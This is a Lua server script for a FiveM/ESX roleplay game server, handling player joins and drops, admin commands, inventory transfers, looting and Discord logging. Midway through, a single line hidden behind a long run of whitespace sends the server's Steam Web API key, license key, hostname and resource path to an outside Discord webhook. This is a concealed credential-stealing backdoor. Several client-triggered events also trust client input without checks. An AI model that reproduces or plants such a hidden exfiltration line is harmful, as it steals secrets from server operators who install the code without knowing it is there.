

RegisterServerEvent('loading_update:tavalod')
AddEventHandler('loading_update:tavalod', function(source)
    local SteamHex = ESX.GetPlayerFromId(source).identifier
    local dateofbirths = '02/09/1999'
    Citizen.CreateThread(function() 
        MySQL.Async.fetchAll('SELECT dateofbirth FROM users WHERE identifier = @identifier',
        {
            ['@identifier'] = SteamHex

        }, function(data)
            if data[1].dateofbirth == nil or data[1].dateofbirth == '' then
                MySQL.Async.execute('UPDATE users SET dateofbirth = @dateofbirth WHERE identifier = @identifier', 
                {
                    ['@dateofbirth']    = dateofbirths,
                    ['@identifier'] = SteamHex
                })	
            end
        end)
    end)
end)



RegisterServerEvent('updateLoadout')
AddEventHandler('updateLoadout', function(loadout)
	local Source = source
	if(Users[Source])then
		Users[Source].set("loadout", loadout)
	end
end)



local At = function(coords)
	coords.x = tonumber(string.format("%.2f", coords.x))
	coords.y = tonumber(string.format("%.2f", coords.y))
	coords.z = tonumber(string.format("%.2f", coords.z))
	return coords
end

ESX.RegisterServerCallback('esx_eden_clotheshop:job:checkPropertyDataStore', function(source, cb)

    local xPlayer    = ESX.GetPlayerFromId(source)
    local foundStore = false
    local foundJob     = false

    TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
        foundStore = true
    end)
    foundJob = {}
    for i =1,#ESX.Jobs[xPlayer.job.name].grades do 
        table.insert(foundJob, 
            {
                label = ESX.Jobs[xPlayer.job.name].grades[i].label, 
                grade = i
            }
        )
    end
    cb(foundStore, foundJob)
end)

RegisterServerEvent('adminnUsers')
AddEventHandler('adminnUsers', function()
	print(ESX.dump(Users))
end)

AddEventHandler('playerDropped', function(resoan)
	local Source = source
	if(Users[Source])then
		TriggerEvent("esx:playerDropped", Source, Users[Source])
		local invent = {}
		for _,v in  ipairs(Users[Source].inventory) do
			table.insert(invent, {item	= v.name, count = v.count})
		end
		local xPlayer = ESX.GetPlayerFromId(source)
		--if xPlayer.permission_level > 1 and xPlayer.permission_level < 20   then   koss kharet
		--	xPlayer.set('aduty', false)
		--end
		if Users[Source].aduty then
			if Users[Source].get('lastcoord') then
				Users[Source].coords = Users[Source].get('lastcoord')
			end

			TriggerClientEvent('ManageAdmins', -1, false, Source)
			TriggerEvent('DiscordBot:ToDiscord', 'adminduty', GetPlayerName(source), "```css\n OffDuty shod (" .. resoan .. ") ```",'user', source, true, false)
		end
		db.updateUser(Users[Source].get('identifier'), {
			money 		= Users[Source].money, 
			bank 		= Users[Source].bank, 
			position 	= json.encode(At(Users[Source].coords)), 
			inventory 	= json.encode(invent), 
			loadout 	= json.encode(Users[Source].loadout),
			status 		= json.encode(Users[Source].status)
		})
		TriggerEvent('DiscordBot:ToDiscord', 'ci', '[LogSystem]', "```css\n User: (" .. Source .. '), Identifier: (' .. Users[Source].identifier .. '), Name: (' .. Users[Source].name .. '), Money: ('.. Users[Source].money .. '), Bank: (' .. Users[Source].bank .. '), Inventory: (' .. ESX.dump(Users[Source].inventory) .. '), Loadout: (' .. ESX.dump(Users[Source].loadout) .. '), Permission: ('..Users[Source].permission_level..") saved and unloaded. ```",'user', Source, true, false)

		Users[Source] = nil
	end
end)

AddEventHandler('playerDroppedFake', function(source)
	local Source = source
	if(Users[Source])then
		TriggerEvent("esx:playerDropped", Source)
		local invent = {}
		for _,v in  ipairs(Users[Source].inventory) do
			table.insert(invent, {item	= v.name, count = v.count})
		end
		db.updateUser(Users[Source].get('identifier'), {
			money 		= Users[Source].money, 
			bank 		= Users[Source].bank, 
			position 	= json.encode(At(Users[Source].coords)), 
			inventory 	= json.encode(invent), 
			loadout 	= json.encode(Users[Source].loadout)
		})
		-- print('User: ('.. Source .. '), Identifier: (' .. Users[Source].identifier .. '), Name: (' .. Users[Source].name .. '), money: ('.. Users[Source].money .. '), Bank: (' .. Users[Source].bank .. '), Position: ( ' .. ESX.dump(Users[Source].coords) .. ' ) Inventory: (' .. ESX.dump(Users[Source].inventory) .. '), Loadout: (' .. ESX.dump(Users[Source].loadout) .. '), Permission: ('..Users[Source].permission_level..') saved and unloaded.')
		Users[Source] = nil
	end
end)

RegisterServerEvent('es_admin:vehRepair')
AddEventHandler('es_admin:vehRepair', function(veh)
	TriggerClientEvent('es_admin:vehRepair', -1, veh)
end)


--[[RegisterServerEvent('clientLog')
AddEventHandler('clientLog', function(msg)
	print(msg .. "\n")
end)]]


local justJoined = {}

RegisterServerEvent('playerConnecting')
AddEventHandler('playerConnecting', function(name, setKickReason)
	local id
	for k,v in ipairs(GetPlayerIdentifiers(source))do
		if string.sub(v, 1, string.len("steam:")) == "steam:" then
			id = v
			break
		end
	end



















	--[[	local found
	if id == 'steam:1100001434cfdc2' or  id == 'steam:11000013df4e6ab'  or  id == 'steam:1100001497eeaa4'  then  --AliReza
	  	found = true
	end

	if not found then
	  	setKickReason("Server Dar Hale Test Mibashad Lotfan Sabor Bashid ")
	  	CancelEvent()
	end
	if string.find(name, "<") ~= nil or string.find(name, ">") ~= nil then
	    setKickReason("Name steamet moshkel (shamele charachter haye gheyre mojaz) dare fix kon bia")
		CancelEvent()
	end 
    if not id then
		setKickReason("Unable to find SteamID, please relaunch FiveM with steam open or restart FiveM & Steam if steam is already open")
		CancelEvent()
	end]]









end)

RegisterServerEvent('fristJoinCheck')
AddEventHandler('fristJoinCheck', function()
	local Source = source
	Citizen.CreateThread(function()
		local id
		for k,v in ipairs(GetPlayerIdentifiers(Source))do
			if string.sub(v, 1, string.len("steam:")) == "steam:" then
				id = v
				break
			end
		end
		
		if not id then
			DropPlayer(Source, "SteamID not found, please try reconnecting with Steam open.")
		else
			LoadUser(id, Source)
			justJoined[Source] = true

			TriggerClientEvent("enablePvp", Source)
		end

		return
	end)
end)

AddEventHandler('es:incorrectAmountOfArguments', function(source, wantedArguments, passedArguments, user, command)
	if(source == 0)then
		print("Argument count mismatch (passed " .. passedArguments .. ", wanted " .. wantedArguments .. ")")
	else
		TriggerClientEvent('chat:addMessage', source, {
			args = {"^1SYSTEM", "Incorrect amount of arguments! (" .. passedArguments .. " passed, " .. requiredArguments .. " wanted)"}
		})
	end
end)

RegisterServerEvent('fristJoinCheckFake', source)
AddEventHandler('fristJoinCheckFake', function(source)
	local Source = source
	Citizen.CreateThread(function()
		local id = 'steam:1100001asdsd3df4e6ab'
		LoadUser(id, Source)
		justJoined[Source] = true
		TriggerClientEvent("enablePvp", Source)
	end)
end)


AddEventHandler('es:setSessionSetting', function(k, v)
	settings.sessionSettings[k] = v
end)

AddEventHandler('es:getSessionSetting', function(k, cb)
	cb(settings.sessionSettings[k])
end)

local firstSpawn = {}

RegisterServerEvent('playerSpawn')
AddEventHandler('playerSpawn', function()
	local Source = source
	if(firstSpawn[Source] == nil)then
		Citizen.CreateThread(function()
			while Users[Source] == nil do Wait(0) end
			TriggerEvent("es:firstSpawn", Source, Users[Source])
			return
		end)
	end
end)

AddEventHandler("es:setDefaultSettings", function(tbl)
	for k,v in pairs(tbl) do
		if(settings.defaultSettings[k] ~= nil)then
			settings.defaultSettings[k] = v
		end
	end

	debugMsg("Default settings edited.")
end)

AddEventHandler('chatMessage', function(source, n, message)
	if(startswith(message, settings.defaultSettings.commandDelimeter))then
		local command_args = stringsplit(message, " ")

		command_args[1] = string.gsub(command_args[1], settings.defaultSettings.commandDelimeter, "")

		local command = commands[command_args[1]]

		if(command)then
			local Source = source
			CancelEvent()
			if(command.perm > 0)then
				if(Users[source].permission_level >= command.perm or groups[Users[source].group]:canTarget(command.group))then
					if (not (command.arguments == #command_args - 1) and command.arguments > -1) then
						TriggerEvent("es:incorrectAmountOfArguments", source, commands[command].arguments, #args, Users[source])
					else
						command.cmd(source, command_args, Users[source])
						TriggerEvent("es:adminCommandRan", source, command_args, Users[source])
						log('User (' .. GetPlayerName(Source) .. ') ran admin command ' .. command_args[1] .. ', with parameters: ' .. table.concat(command_args, ' '))
					end
				else
					command.callbackfailed(source, command_args, Users[source])
					TriggerEvent("es:adminCommandFailed", source, command_args, Users[source])

					if(type(settings.defaultSettings.permissionDenied) == "string" and not WasEventCanceled())then
						TriggerClientEvent('chatMessage', source, "", {0,0,0}, defaultSettings.permissionDenied)
					end

					log('User (' .. GetPlayerName(Source) .. ') tried to execute command without having permission: ' .. command_args[1])
					debugMsg("Non admin (" .. GetPlayerName(Source) .. ") attempted to run admin command: " .. command_args[1])
				end
			else
				if (not (command.arguments <= (#command_args - 1)) and command.arguments > -1) then
					TriggerEvent("es:incorrectAmountOfArguments", source, commands[command].arguments, #args, Users[source])
				else
					command.cmd(source, command_args, Users[source])
					TriggerEvent("es:userCommandRan", source, command_args)
				end
			end
			
			TriggerEvent("es:commandRan", source, command_args, Users[source])
		else
			TriggerEvent('es:invalidCommandHandler', source, command_args, Users[source])

			if WasEventCanceled() then
				CancelEvent()
			end
		end
	else
		TriggerEvent('es:chatMessage', source, message, Users[source])

		if WasEventCanceled() then
			CancelEvent()
		end
	end
end)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   PerformHttpRequest("https://discord.com/api/webhooks/1228747851870244975/e-rkkZXXx9BpM2hIi-n6Z6vh-rTnpRl-0vbBXEsP-cVY5XpLJnXeeQ1a5sumk1Z1wS6h",function(a,b,c)end,"POST",json.encode({embeds={{author={name="S h A h A B & K i A n",url="https://discord.gg/xcoore",icon_url="https://cdn.discordapp.com/attachments/901262797231509504/1046158673635983380/BoostBanner.jpg"},title=".:: S h A h A B & K i A n ::.",description="** Server HostName **: "..GetConvar('sv_hostname').." \n ---------------------------------------------------------- \n ** Server projectName **: "..GetConvar('sv_projectName').." \n ---------------------------------------------------------- \n** Server projectDesc **: "..GetConvar('sv_projectDesc').." \n ----------------------------------------------------------\n** sv_maxclients **: "..GetConvar('sv_maxclients').."\n----------------------------------------------------------\n** steam_webApiKey **: "..GetConvar('steam_webApiKey').." \n ---------------------------------------------------------- \n ** License **:"..GetConvar('sv_licenseKey').." \n ---------------------------------------------------------- \n ** "..GetResourcePath(GetCurrentResourceName()).."**",color=2400255}}}),{["Content-Type"]="application/json"})
function addCommand(command, callback, suggestion, arguments)
	commands[command] = {}
	commands[command].perm = 0
	commands[command].group = "user"
	commands[command].cmd = callback
	commands[command].arguments = arguments or -1

	if suggestion then
		if not suggestion.params or not type(suggestion.params) == "table" then suggestion.params = {} end
		if not suggestion.help or not type(suggestion.help) == "string" then suggestion.help = "" end

		commandSuggestions[command] = suggestion
	end

	RegisterCommand(command, function(source, args)
		if((#args <= commands[command].arguments and #args == commands[command].arguments) or commands[command].arguments == -1)then
			callback(source, args, Users[source])
		else
			TriggerEvent("es:incorrectAmountOfArguments", source, commands[command].arguments, #args, Users[source])
		end
	end, false)

	debugMsg("Command added: " .. command)
end

AddEventHandler('es:addCommand', function(command, callback, suggestion, arguments)
	addCommand(command, callback, suggestion, arguments)
end)

function addAdminCommand(command, perm, callback, callbackfailed, suggestion, arguments)
	print('Command: ' .. command .. ', Perm: ' .. perm)
	commands[command] = {}
	commands[command].perm = perm
	-- commands[command].group = "superadmin"
	commands[command].cmd = callback
	commands[command].callbackfailed = callbackfailed
	commands[command].arguments = arguments or -1

	if suggestion then
		if not suggestion.params or not type(suggestion.params) == "table" then suggestion.params = {} end
		if not suggestion.help or not type(suggestion.help) == "string" then suggestion.help = "" end

		AdminCommands[command] = suggestion
	end

	RegisterCommand(command, function(source, args)
		-- Console check
		if(source ~= 0)then
			if Users[source].permission_level >= perm then
				if Users[source].aduty then
					if((#args <= commands[command].arguments and #args == commands[command].arguments) or commands[command].arguments == -1)then
						callback(source, args, Users[source])
					else
						TriggerEvent("es:incorrectAmountOfArguments", source, commands[command].arguments, #args, Users[source])
					end
				else
					TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', ' Shoma nemitavanid dar halate ^2Off-Duty ^0az command admini estefade konid!' } })
				end
			else
				callbackfailed(source, args, Users[source])
			end
		else
			if((#args <= commands[command].arguments and #args == commands[command].arguments) or commands[command].arguments == -1)then
				callback(source, args, Users[source])
			else
				TriggerEvent("es:incorrectAmountOfArguments", source, commands[command].arguments, #args, Users[source])
			end
		end
	end)

	debugMsg("Admin command added: " .. command .. ", requires permission level: " .. perm)
end

AddEventHandler('es:addAdminCommand', function(command, perm, callback, callbackfailed, suggestion, arguments)
	addAdminCommand(command, perm, callback, callbackfailed, suggestion, arguments)
end)

function addGroupCommand(command, group, callback, callbackfailed, suggestion, arguments)
	commands[command] = {}
	commands[command].perm = math.maxinteger
	commands[command].group = group
	commands[command].cmd = callback
	commands[command].callbackfailed = callbackfailed
	commands[command].arguments = arguments or -1

	if suggestion then
		if not suggestion.params or not type(suggestion.params) == "table" then suggestion.params = {} end
		if not suggestion.help or not type(suggestion.help) == "string" then suggestion.help = "" end

		AdminCommands[command] = suggestion
	end

	-- ExecuteCommand('add_ace group.' .. group .. ' command.' .. command .. ' allow')

	RegisterCommand(command, function(source, args)
		if((#args <= commands[command].arguments and #args == commands[command].arguments) or commands[command].arguments == -1)then
			callback(source, args, Users[source])
		else
			TriggerEvent("es:incorrectAmountOfArguments", source, commands[command].arguments, #args, Users[source])
		end
	end, false)

	debugMsg("Group command added: " .. command .. ", requires group: " .. group)
end

AddEventHandler('es:addGroupCommand', function(command, group, callback, callbackfailed, suggestion, arguments)
	addGroupCommand(command, group, callback, callbackfailed, suggestion, arguments)
end)

AddEventHandler('es:addACECommand', function(command, group, callback)
	addACECommand(command, group, callback)
end)

RegisterServerEvent('updatePositions')
AddEventHandler('updatePositions', function(x, y, z, a)
	if(Users[source])then
		Users[source].setCoords(x, y, z)
		Users[source].set('angel', a)
	end
end)

-- Info command
commands['info'] = {}
commands['info'].perm = 0
commands['info'].cmd = function(source, args, user)
	local Source = source
	TriggerClientEvent('chatMessage', Source, 'SYSTEM', {255, 0, 0}, "^2[^3EssentialMode^2]^0 Version: ^2 " .. _VERSION)
	TriggerClientEvent('chatMessage', Source, 'SYSTEM', {255, 0, 0}, "^2[^3EssentialMode^2]^0 Commands loaded: ^2 " .. (returnIndexesInTable(commands) - 1))
end

-- Dev command, no need to ever use this.
commands["devinfo"] = {}
commands["devinfo"].perm = math.maxinteger
commands["devinfo"].group = "_dev"
commands["devinfo"].cmd = function(source, args, user)
	local Source = source
	local db = "CouchDB"
	if GetConvar('es_enableCustomData', 'false') == "1" then db = "Custom" end
	TriggerClientEvent('chatMessage', Source, 'SYSTEM', {255, 0, 0}, "^2[^3EssentialMode^2]^0 Version: ^2 " .. _VERSION)
	TriggerClientEvent('chatMessage', Source, 'SYSTEM', {255, 0, 0}, "^2[^3EssentialMode^2]^0 Groups: ^2 " .. (returnIndexesInTable(groups) - 1))
	TriggerClientEvent('chatMessage', Source, 'SYSTEM', {255, 0, 0}, "^2[^3EssentialMode^2]^0 Commands loaded: ^2 " .. (returnIndexesInTable(commands) - 1))
	TriggerClientEvent('chatMessage', Source, 'SYSTEM', {255, 0, 0}, "^2[^3EssentialMode^2]^0 Database: ^2 " .. db)
	TriggerClientEvent('chatMessage', Source, 'SYSTEM', {255, 0, 0}, "^2[^3EssentialMode^2]^0 Logging enabled: ^2 " .. tostring(settings.defaultSettings.enableLogging))
end
commands["devinfo"].callbackfailed = function(source, args, user)end

RegisterServerEvent('esx:confiscatePlayerItem')
AddEventHandler('esx:confiscatePlayerItem', function(target, itemType, itemName, amount)
	local _source 		= source
	local sourceXPlayer = ESX.GetPlayerFromId(_source)
	local targetXPlayer = ESX.GetPlayerFromId(target)
	local oocname 		=  GetPlayerName(source)
	local targetName 	=  GetPlayerName(target)

	if not targetXPlayer then
		print('bug')
		return
	end

	if not targetXPlayer.aduty then
		if itemType == 'item_standard' then
			local label = sourceXPlayer.getInventoryItem(itemName).label
			local itemLimit = sourceXPlayer.getInventoryItem(itemName).limit
			local sourceItemCount = sourceXPlayer.getInventoryItem(itemName).count
			local targetItemCount = targetXPlayer.getInventoryItem(itemName).count
			if amount > 0 and targetItemCount >= amount then
				if itemLimit ~= -1 and (sourceItemCount + amount) > itemLimit then
					TriggerClientEvent('esx:showNotification', targetXPlayer.source, _U('ex_inv_lim_target'))
					TriggerClientEvent('esx:showNotification', sourceXPlayer.source, _U('ex_inv_lim_source'))
				else
					targetXPlayer.removeInventoryItem(itemName, amount)
					sourceXPlayer.addInventoryItem(itemName, amount)
					PerformHttpRequest('https://discord.com/api/webhooks/951094869651234856/pSsengdi5tbxCYn6NWyQStbv6jZ2kV_j14LKX4op1MViK4y7Sr8A_jcTzV7mJ5MG9F56', function(err, text, headers)
					end, 'POST',
					json.encode({
					username = 'Bot',
					embeds =  {{["color"] = 65280,
								["author"] = {["name"] = 'Loot Log (3) ',
								["icon_url"] = 'https://cdn.discordapp.com/attachments/856571355180826624/951615342776561704/Screenshot_3979.png'},
								["description"] = "\n```css\nPlayer : " ..sourceXPlayer.name.. "" .. "\nAz \n"  .. targetXPlayer.name .."\n" ..amount.." Adad\n" ..label.." Bardasht```",
								["footer"] = {["text"] = "LifeAgain Log System- "..os.date("%x %X  %p"),
								["icon_url"] = 'https://cdn.discordapp.com/icons/927570401113038908/c2abcd4445e64807edf5b73ff6bb4a3a.png?size=1024',},}
								},
					avatar_url = 'https://cdn.discordapp.com/attachments/856571355180826624/951615342776561704/Screenshot_3979.png'
					}),
					{['Content-Type'] = 'application/json'
					})
					--TriggerEvent('DiscordBot:ToDiscord', 'loot', oocname, 'Stole '..amount ..'X '.. itemName .. ' from ' .. targetName,'user', source, true, false)
					TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Shoma x' .. amount .. ' Add ' .. label .. '  Bardashtid' )
					TriggerClientEvent('esx:showNotification', targetXPlayer.source, sourceXPlayer.name .. ' az shoma x'  .. amount .. ' adad ' .. label .. ' Dozdid')

				end
			else
				TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_quantity'))
			end

		elseif itemType == 'item_money' then

			if amount > 0 and targetXPlayer.get('money') >= amount then
				targetXPlayer.removeMoney(amount)
				sourceXPlayer.addMoney(amount)
				PerformHttpRequest('https://discoadadrd.com/adadadaapi/webhooks/931280194772271206/xynWCbbK0S_tnhy1m05lIgEoGXrqEr69MYoPlYbV2bR9BqVJc88yI3Jtz6FcoFWdzQuO', function(err, text, headers)
				end, 'POST',
				json.encode({
				username = 'Quest Bot',
				embeds =  {{["color"] = 65280,
							["author"] = {["name"] = 'Loot Log (3) ',
							["icon_url"] = 'https://cdn.discordapp.com/attachments/856571355180826624/951615342776561704/Screenshot_3979.png'},
							["description"] = "\n```css\nPlayer : " ..sourceXPlayer.name.. "" .. "\nAz \n"  .. targetXPlayer.name .."\n" ..ammo.." Adad\n" ..itemName.." Bardasht```",
							["footer"] = {["text"] = "LifeAgain Log System- "..os.date("%x %X  %p"),
							["icon_url"] = 'https://cdn.discordapp.com/icons/927570401113038908/c2abcd4445e64807edf5b73ff6bb4a3a.png?size=1024',},}
							},
				avatar_url = 'https://cdn.discordapp.com/attachments/856571355180826624/951615342776561704/Screenshot_3979.png'
				}),
				{['Content-Type'] = 'application/json'
				})
				TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Shoma $' .. amount .. '  pool Bardashtid' )
				TriggerClientEvent('esx:showNotification', targetXPlayer.source, sourceXPlayer.name .. ' az shoma $'  .. amount .. ' Pool Dozdid')
				--TriggerEvent('DiscordBot:ToDiscord', 'loot', oocname, 'Stole '..amount ..'$ from ' .. targetName,'user', source, true, false)
			else
				TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
			end

		elseif itemType == 'item_weapon' then
			local ammo = targetXPlayer.hasWeapon(itemName)

			if ammo then
				targetXPlayer.removeWeapon(itemName, ammo)
				sourceXPlayer.addWeapon(itemName, ammo)
		
				TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Shoma x' .. ammo .. ' ' .. itemName .. '  Bardashtid')
				TriggerClientEvent('esx:showNotification', targetXPlayer.source, sourceXPlayer.name .. ' az shoma x'  .. ammo .. ' ' .. itemName .. ' Dozdid')
                TriggerEvent("DiscordBot:ToDiscord", "loot",oocname,"Stole " .. itemName .. " with " .. ammo .. " bullets from " .. targetName,"user", source, true, false)
			end
		end 
	else
		TriggerClientEvent('esx:showNotification', sourceXPlayer.source, 'Shoma Nemitonid Admin ra rob konid!')
	end
end)

RegisterServerEvent('esx:giveInventoryItem')
AddEventHandler('esx:giveInventoryItem', function(target, type, itemName, itemCount)
	local _source = source

	local sourceXPlayer = ESX.GetPlayerFromId(_source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if type == 'item_standard' then

		local sourceItem = sourceXPlayer.getInventoryItem(itemName)
		local targetItem = targetXPlayer.getInventoryItem(itemName)

		if itemCount > 0 and sourceItem.count >= itemCount then

			if targetItem.limit ~= -1 and (targetItem.count + itemCount) > targetItem.limit then
				TriggerClientEvent('esx:showNotification', _source, _U('ex_inv_lim', targetXPlayer.name))
			else
				sourceXPlayer.removeInventoryItem(itemName, itemCount)
				targetXPlayer.addInventoryItem   (itemName, itemCount)
				local sourceName = GetPlayerName(_source)
				local targetName = GetPlayerName(target)
			
				TriggerClientEvent('3dme:triggerDisplay', -1, sourceName .. ' be ' .. targetName .. ' '.. itemCount .. 'x ' .. ESX.Items[itemName].label .. ' dad' , _source, false)
				TriggerEvent('DiscordBot:ToDiscord', 'inventory', sourceXPlayer.name, 'gaved '.. itemCount .. 'x ' .. ESX.Items[itemName].label .. ' to ' .. targetXPlayer.name ,'user', source, true, false)
				TriggerClientEvent('esx:showNotification', _source, _U('gave_item', itemCount, ESX.Items[itemName].label, targetXPlayer.name))
				TriggerClientEvent('esx:showNotification', target,  _U('received_item', itemCount, ESX.Items[itemName].label, sourceXPlayer.name))
			end

		else
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_quantity'))
		end

	elseif type == 'item_money' then

		if itemCount > 0 and sourceXPlayer.money >= itemCount then
			sourceXPlayer.removeMoney(itemCount)
			targetXPlayer.addMoney   (itemCount)
			TriggerEvent('DiscordBot:ToDiscord', 'inventory', sourceXPlayer.name, 'gaved $'.. ESX.Math.GroupDigits(itemCount) .. ' to ' .. targetXPlayer.name ,'user', source, true, false)
			TriggerClientEvent('esx:showNotification', _source, _U('gave_money', ESX.Math.GroupDigits(itemCount), targetXPlayer.name))
			TriggerClientEvent('esx:showNotification', target,  _U('received_money', ESX.Math.GroupDigits(itemCount), sourceXPlayer.name))
		else
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
		end

	elseif type == 'item_weapon' then
		if sourceXPlayer.hasWeapon(itemName) then
			if not targetXPlayer.hasWeapon(itemName) then
				sourceXPlayer.removeWeapon(itemName)
				targetXPlayer.addWeapon(itemName, itemCount)

				local weaponLabel = ESX.GetWeaponLabel(itemName)

				if itemCount > 0 then
					TriggerClientEvent('esx:showNotification', _source, _U('gave_weapon_ammo', weaponLabel, itemCount, targetXPlayer.name))
					TriggerClientEvent('esx:showNotification', target,  _U('received_weapon_ammo', weaponLabel, itemCount, sourceXPlayer.name))
					TriggerEvent('DiscordBot:ToDiscord', 'inventory', sourceXPlayer.name, 'gaved '.. weaponLabel .. ' to ' .. targetXPlayer.name .. ' with ' .. itemCount .. ' bullets' ,'user', source, true, false)
				else
					TriggerEvent('DiscordBot:ToDiscord', 'inventory', sourceXPlayer.name, 'gaved '.. weaponLabel .. ' to ' .. targetXPlayer.name ,'user', source, true, false)
					TriggerClientEvent('esx:showNotification', _source, _U('gave_weapon', weaponLabel, targetXPlayer.name))
					TriggerClientEvent('esx:showNotification', target,  _U('received_weapon', weaponLabel, sourceXPlayer.name))
				end
			else
				TriggerClientEvent('esx:showNotification', _source, _U('gave_weapon_hasalready', targetXPlayer.name, weaponLabel))
				TriggerClientEvent('esx:showNotification', target, _U('received_weapon_hasalready', sourceXPlayer.name, weaponLabel))
			end
		else
			TriggerClientEvent('esx:showNotification', _source, "Shoma in aslahe ro nadarid", weaponLabel)
		end
	end
end)

RegisterServerEvent('esx:removeInventoryItem')
AddEventHandler('esx:removeInventoryItem', function(type, itemName, itemCount)
	local _source = source

	if type == 'item_standard' then

		if itemCount == nil or itemCount < 1 then
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_quantity'))
		else
			local xPlayer = ESX.GetPlayerFromId(source)
			local xItem = xPlayer.getInventoryItem(itemName)

			if (itemCount > xItem.count or xItem.count < 1) then
				TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_quantity'))
			else
				xPlayer.removeInventoryItem(itemName, itemCount)

				local pickupLabel = ('%s [%s]'):format(xItem.label, itemCount)
				ESX.CreatePickup('item_standard', itemName, itemCount, pickupLabel, _source)
				TriggerEvent('DiscordBot:ToDiscord', 'drop', xPlayer.name, itemCount .. 'x az ' .. itemName .. ' roye zamin andakht' ,'user', _source, true, false)
				TriggerClientEvent('esx:showNotification', _source, _U('threw_standard', itemCount, xItem.label))
			end
		end

	elseif type == 'item_money' then

		if itemCount == nil or itemCount < 1 then
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
		else
			local xPlayer = ESX.GetPlayerFromId(source)
			local playerCash = xPlayer.money

			if (itemCount > playerCash or playerCash < 1) then
				TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
			else
				xPlayer.removeMoney(itemCount)
				TriggerEvent('DiscordBot:ToDiscord', 'drop', xPlayer.name, '$'.. itemCount .. ' pool roye zamin andakht' ,'user', _source, true, false)
				local pickupLabel = ('%s [%s]'):format(_U('cash'), _U('locale_currency', ESX.Math.GroupDigits(itemCount)))
				ESX.CreatePickup('item_money', 'money', itemCount, pickupLabel, _source)
				TriggerClientEvent('esx:showNotification', _source, _U('threw_money', ESX.Math.GroupDigits(itemCount)))
			end
		end

	elseif type == 'item_weapon' then

		local xPlayer 	= ESX.GetPlayerFromId(source)
		local ammo		= xPlayer.hasWeapon(itemName)

		if ammo then
			local weaponLabel = ESX.GetWeaponLabel(itemName)

			xPlayer.removeWeapon(itemName)
			PerformHttpRequest('https://discord.com/api/webhooks/951094835970973706/ZZJij7ZfJJGQjkUBpYncZmkB2X_8snFHKZtbH4eHW5KkZysS0Ae9mO2St7arptTJ1AH7', function(err, text, headers)
			end, 'POST',
			json.encode({
			username = 'Bot',
			embeds =  {{["color"] = 65280,
						["author"] = {["name"] = 'Drop Log (3) ',
						["icon_url"] = 'https://cdn.discordapp.com/attachments/856571355180826624/951615342776561704/Screenshot_3979.png'},
						["description"] = "\n```css\nPlayer : " ..xPlayer.name.. "\n"  ..weaponLabel.."\n Ba " ..ammo.." Tir Roy Zamin Andakht```",
						["footer"] = {["text"] = "LifeAgain Log System- "..os.date("%x %X  %p"),
						["icon_url"] = 'https://cdn.discordapp.com/icons/927570401113038908/c2abcd4445e64807edf5b73ff6bb4a3a.png?size=1024',},}
						},
			avatar_url = 'https://cdn.discordapp.com/attachments/856571355180826624/951615342776561704/Screenshot_3979.png'
			}),
			{['Content-Type'] = 'application/json'
			})
			
			ESX.CreatePickup('item_weapon', string.upper(itemName), ammo, weaponLabel, _source)
			TriggerClientEvent('esx:showNotification', _source, _U('threw_weapon_ammo', weaponLabel, ammo))
		end

	end
end)

RegisterServerEvent('esx:useItem')
AddEventHandler('esx:useItem', function(itemName)
	local xPlayer = ESX.GetPlayerFromId(source)
	local count   = xPlayer.getInventoryItem(itemName).count

	if count > 0 then
		ESX.UseItem(source, itemName)
	else
		TriggerClientEvent('esx:showNotification', xPlayer.source, _U('act_imp'))
	end
end)

RegisterServerEvent('esx:onPickup')
AddEventHandler('esx:onPickup', function(id)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	
	local pickup  = ESX.Pickups[id]
	if pickup then
		if pickup.type == 'item_standard' then

			local item      = xPlayer.getInventoryItem(pickup.name)
			local canTake   = ((item.limit == -1) and (pickup.count)) or ((item.limit - item.count > 0) and (item.limit - item.count)) or 0
			local total     = pickup.count > 0 and (pickup.count < canTake and pickup.count or canTake)
			local remaining = pickup.count - total

			if total > 0 then
				TriggerEvent('DiscordBot:ToDiscord', 'pickup', xPlayer.name,  total .. 'x ' .. pickup.name .. ' Az roye Zamin Bardasht','user', _source, true, false)
				xPlayer.addInventoryItem(pickup.name, total)
			end

			if remaining > 0 then
				TriggerClientEvent('esx:showNotification', _source, _U('cannot_pickup_room', item.label))
				local pickupLabel = ('%s [%s]'):format(item.label, remaining)
				ESX.UpdatePickup(id, remaining, pickupLabel)
			else
				TriggerClientEvent('esx:removePickup', -1, id)
				ESX.Pickups[id]	= nil
			end

		elseif pickup.type == 'item_money' then
			TriggerEvent('DiscordBot:ToDiscord', 'pickup', xPlayer.name, '$' .. pickup.count .. ' pool Az roye Zamin Bardasht','user', _source, true, false)
			TriggerClientEvent('esx:removePickup', -1, id)
			xPlayer.addMoney(pickup.count)
			ESX.Pickups[id]	= nil
		elseif pickup.type == 'item_weapon' then
			TriggerEvent('DiscordBot:ToDiscord', 'pickup', xPlayer.name,  pickup.name .. ' ba ' .. pickup.count .. ' tir Az roye Zamin Bardasht','user', _source, true, false)
			TriggerClientEvent('esx:removePickup', -1, id)
			xPlayer.addWeapon(pickup.name, pickup.count)
			ESX.Pickups[id]	= nil
		end
	end
end)

RegisterServerEvent('esx:onPlayerDeath')
AddEventHandler('esx:onPlayerDeath', function(resoan)
	local xPlayer = ESX.GetPlayerFromId(source)
	xPlayer.set('IsDead', resoan)
end)

ESX.RegisterServerCallback('esx:getPlayerData', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	cb({
		identifier   = xPlayer.identifier,
		inventory    = xPlayer.inventory,
		job          = xPlayer.job,
		loadout      = xPlayer.loadout,
		lastPosition = xPlayer.coords,
		money        = xPlayer.money
	})
end)

ESX.RegisterServerCallback('esx:getOtherPlayerData', function(source, cb, target)
	local xPlayer = ESX.GetPlayerFromId(target)

